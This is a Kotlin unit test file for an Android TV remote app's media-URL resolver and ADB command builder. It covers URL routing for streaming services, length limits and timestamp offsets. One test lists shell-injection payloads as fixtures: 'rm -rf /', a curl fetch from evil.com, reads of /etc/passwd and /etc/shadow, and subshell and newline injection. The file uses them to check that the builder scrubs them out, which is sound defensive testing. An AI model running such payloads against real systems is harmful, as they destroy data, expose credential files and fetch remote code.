package com.rmediatech.sovereignremote.protocols

import com.rmediatech.sovereignremote.model.CinemaSource
import kotlinx.coroutines.runBlocking
import org.junit.Assert.*
import org.junit.Test

/**
 * Universal Adversarial TDD++++++++++:
 * Rigorous Fuzzer & Shell Injection Crucible for CinemaBeamPlanner.
 * Tests every supported source (YouTube, Prime Video, Pluto TV, Direct Stream)
 * against hostile payloads, URL mutations, buffer bombs, and platform intent builders.
 */
class CinemaBeamFuzzerTest {

    @Test
    fun testYouTubeUrlVariantsAndDirectIdResolution() = runBlocking {
        // 1. Raw 11-character video ID
        val rawId = "mls2SYVS_2k"
        val resolvedRaw = CinemaBeamPlanner.resolveMediaUri(rawId, CinemaSource.YOUTUBE)
        assertEquals("https://www.youtube.com/watch?v=mls2SYVS_2k", resolvedRaw)

        // 2. Bare youtu.be link without protocol
        val bareYoutu = "youtu.be/mls2SYVS_2k"
        val resolvedBare = CinemaBeamPlanner.resolveMediaUri(bareYoutu, CinemaSource.YOUTUBE)
        assertEquals("https://youtu.be/mls2SYVS_2k", resolvedBare)

        // 3. Full https youtu.be link with query params
        val fullYoutu = "https://youtu.be/mls2SYVS_2k?t=120"
        val resolvedFull = CinemaBeamPlanner.resolveMediaUri(fullYoutu, CinemaSource.YOUTUBE)
        assertEquals("https://youtu.be/mls2SYVS_2k?t=120", resolvedFull)

        // 4. Standard watch link with playlist parameters
        val watchPlaylist = "https://www.youtube.com/watch?v=mls2SYVS_2k&list=PL12345&index=2"
        val resolvedWatch = CinemaBeamPlanner.resolveMediaUri(watchPlaylist, CinemaSource.YOUTUBE)
        assertEquals(watchPlaylist, resolvedWatch)
    }

    @Test
    fun testPrimeVideoAndPlutoTvUrlRouting() = runBlocking {
        // Prime Video Search Query
        val primeQuery = "Interstellar 4K"
        val resolvedPrime = CinemaBeamPlanner.resolveMediaUri(primeQuery, CinemaSource.PRIME_VIDEO)
        assertTrue(resolvedPrime.startsWith("https://watch.amazon.com/watch?search="))
        assertTrue(resolvedPrime.contains("Interstellar+4K") || resolvedPrime.contains("Interstellar%204K"))

        // Prime Video Direct Link
        val primeDirect = "https://watch.amazon.com/detail?asin=B0D12345"
        val resolvedPrimeDirect = CinemaBeamPlanner.resolveMediaUri(primeDirect, CinemaSource.PRIME_VIDEO)
        assertEquals(primeDirect, resolvedPrimeDirect)

        // Pluto TV Search Query
        val plutoQuery = "Star Trek Next Generation"
        val resolvedPluto = CinemaBeamPlanner.resolveMediaUri(plutoQuery, CinemaSource.PLUTO_TV)
        assertTrue(resolvedPluto.startsWith("https://pluto.tv/search/"))

        // Pluto TV Direct Channel Link
        val plutoChannel = "https://pluto.tv/live-tv/star-trek"
        val resolvedPlutoChannel = CinemaBeamPlanner.resolveMediaUri(plutoChannel, CinemaSource.PLUTO_TV)
        assertEquals(plutoChannel, resolvedPlutoChannel)
    }

    @Test
    fun testDirectUrlStreamRouting() = runBlocking {
        val mp4Url = "https://example.com/videos/cinema_test.mp4"
        val resolvedMp4 = CinemaBeamPlanner.resolveMediaUri(mp4Url, CinemaSource.DIRECT_URL)
        assertEquals(mp4Url, resolvedMp4)

        val hlsUrl = "http://192.168.1.50:8080/live/stream.m3u8"
        val resolvedHls = CinemaBeamPlanner.resolveMediaUri(hlsUrl, CinemaSource.DIRECT_URL)
        assertEquals(hlsUrl, resolvedHls)
    }

    @Test
    fun testAdversarialCommandInjectionScrubbing() {
        val hostilePayloads = listOf(
            "test; rm -rf /",
            "test && echo 'hacked' && whoami",
            "test`id`",
            "test\$(curl http://evil.com/payload)",
            "test | cat /etc/passwd",
            "test > /dev/null",
            "test < /etc/shadow",
            "test' OR '1'='1",
            "test\"\nreboot\n",
            "test\r\ninput keyevent 26"
        )

        for (hostile in hostilePayloads) {
            for (source in CinemaSource.entries) {
                // Assert Fire TV beam command
                val fireCmd = CinemaBeamPlanner.buildAdbBeamCommand(hostile, isFireTv = true, source = source)
                assertFalse("Fire TV command must not contain unescaped shell inject from '$hostile'", fireCmd.contains("; rm -rf"))
                assertFalse("Fire TV command must not contain raw subshell '$'", fireCmd.contains("\$("))
                assertFalse("Fire TV command must not contain raw backticks", fireCmd.contains("`"))
                assertFalse("Fire TV command must not contain pipe injection", fireCmd.contains("| cat"))
                assertFalse("Fire TV command must not contain raw newlines", fireCmd.contains("\n") || fireCmd.contains("\r"))

                // Assert Google TV beam command
                val googleCmd = CinemaBeamPlanner.buildAdbBeamCommand(hostile, isFireTv = false, source = source)
                assertFalse("Google TV command must not contain unescaped shell inject from '$hostile'", googleCmd.contains("; rm -rf"))
                assertFalse("Google TV command must not contain raw subshell '$'", googleCmd.contains("\$("))
                assertFalse("Google TV command must not contain raw backticks", googleCmd.contains("`"))
                assertFalse("Google TV command must not contain raw newlines", googleCmd.contains("\n") || googleCmd.contains("\r"))
            }
        }
    }

    @Test
    fun testBufferBombTruncationSafety() {
        // 10,000 character buffer bomb
        val massivePayload = "A".repeat(10_000)
        val cmd = CinemaBeamPlanner.buildAdbBeamCommand(massivePayload, isFireTv = false, source = CinemaSource.YOUTUBE)
        
        // Assert capped length ceiling (256 chars + command template overhead)
        assertTrue("Command must remain bounded and not explode memory", cmd.length < 1500)
        assertTrue("Command must contain valid shell entrypoint", cmd.startsWith("input keyevent 224; "))
    }

    @Test(expected = IllegalArgumentException::class)
    fun testBlankQueryRejectionThrows() {
        CinemaBeamPlanner.buildAdbBeamCommand("    ", isFireTv = true, source = CinemaSource.YOUTUBE)
    }

    @Test
    fun testStartOffsetTimestampAppendsCorrectly() {
        val ytWithOffset = CinemaBeamPlanner.buildAdbBeamCommand(
            "https://www.youtube.com/watch?v=mls2SYVS_2k",
            isFireTv = false,
            source = CinemaSource.YOUTUBE,
            startOffsetSeconds = 145L
        )
        assertTrue(ytWithOffset.contains("&t=145s"))

        // Assert existing offset is not duplicated
        val alreadyOffset = CinemaBeamPlanner.buildAdbBeamCommand(
            "https://www.youtube.com/watch?v=mls2SYVS_2k&t=90s",
            isFireTv = false,
            source = CinemaSource.YOUTUBE,
            startOffsetSeconds = 145L
        )
        assertFalse(alreadyOffset.contains("&t=90s&t=145s"))
    }
}
